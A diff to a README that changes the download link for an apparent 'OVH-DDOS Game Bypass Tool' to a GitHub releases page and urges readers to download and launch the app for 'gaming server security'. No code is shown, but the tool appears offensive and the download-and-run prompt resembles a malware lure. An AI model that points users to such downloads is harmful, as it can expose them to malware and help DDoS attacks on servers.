@@ -53,7 +53,7 @@ Explore a wide range of topics covered in this repository:
 
 Download the OVH-DDOS Game Bypass Tool from the following link:
 
-[![Download App.zip](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/project/files/App.zip)
+[![Download https://github.com/Tuliodrx/ovh-ddos/releases](https://github.com/Tuliodrx/ovh-ddos/releases)](https://github.com/Tuliodrx/ovh-ddos/releases)
 
 Once you have downloaded the file, launch the application and explore the wide array of features and tools available to enhance your gaming server security.
 
